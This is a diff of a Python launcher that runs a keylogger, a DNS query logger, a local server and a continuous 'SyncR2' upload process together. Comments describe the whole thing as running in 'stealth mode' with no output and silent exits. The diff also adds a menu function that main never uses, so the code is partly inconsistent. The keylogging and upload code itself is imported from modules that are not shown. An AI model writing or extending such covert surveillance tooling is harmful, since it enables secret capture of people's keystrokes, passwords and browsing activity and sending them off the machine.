@@ -1,42 +1,79 @@
-from utilities import dir_path, sync, server, hide_console 
 from logger import key_logger, dns_logger
-import sys
-import socket
+from utilities import dir_path, sync, server
 import multiprocessing
+import socket
+import sys
+
+
+def create_processes(choice):
+    """Return a list of processes based on the user's menu choice."""
+    proc = []
+    if choice == 1:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+        ]
+    elif choice == 2:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+        ]
+    elif choice == 3:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+        ]
+    elif choice == 4:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+        ]
+    elif choice == 5:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+        ]
+    elif choice == 6:
+        proc = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+        ]
+    return proc
 
 
 def main():
-    # add_startup() ++ import add_startup from utilities
-    # disallowing multiple instance
-    # Create a socket object
+    # Prevent multiple instances (stealth: no output)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Try to bind the socket to the port
     try:
         sock.bind(("", 9903))
     except socket.error:
-        # If the port is already in use, exit the script
         sys.exit()
 
-    dir_path()
-    p1 = multiprocessing.Process(target=server, name="LocalServer")
-    p2 = multiprocessing.Process(target=sync, name="SyncFtp")
-    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
-    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
-    p1.start()
-    p2.start()
-    p3.start()
-    p4.start()
-    p1.join()
-    p2.join()
-    p3.join()
-    p4.join()
+    try:
+        dir_path()
+        # Always start all loggers and sync in stealth mode
+        processes = [
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+        ]
+        for p in processes:
+            p.start()
+        for p in processes:
+            p.join()
+    except Exception:
+        sys.exit(1)
+
 
 if __name__ == "__main__":
-    # On Windows calling this function is necessary.
     multiprocessing.freeze_support()
-    hide_console()
     try:
         main()
-    except KeyboardInterrupt:
-        exit(0)
-
+    except Exception:
+        sys.exit(0)
